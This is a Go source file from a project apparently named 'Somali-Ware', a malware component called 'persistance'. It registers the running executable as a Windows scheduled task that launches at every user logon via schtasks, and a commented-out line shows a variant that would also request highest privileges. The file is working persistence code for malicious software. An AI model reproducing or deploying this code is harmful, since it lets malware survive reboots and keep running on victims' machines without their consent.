package persistance

import (
	"Somali-Ware/settings"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func AddToTaskScheduler() error {
	if !settings.Persistance {
		return nil
	}

	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	exePath, err = filepath.Abs(exePath)
	if err != nil {
		return err
	}

	taskName := "Somali-Ware"

	//command := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "\""+exePath+"\"", "/sc", "ONLOGON", "/f", "/rl", "HIGHEST")
	command := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "\""+exePath+"\"", "/sc", "ONLOGON", "/f")

	output, err := command.CombinedOutput()
	if err != nil {
		return err
	}

	if strings.Contains(string(output), "ERROR:") {
		return errors.New(string(output))
	}

	return nil
}
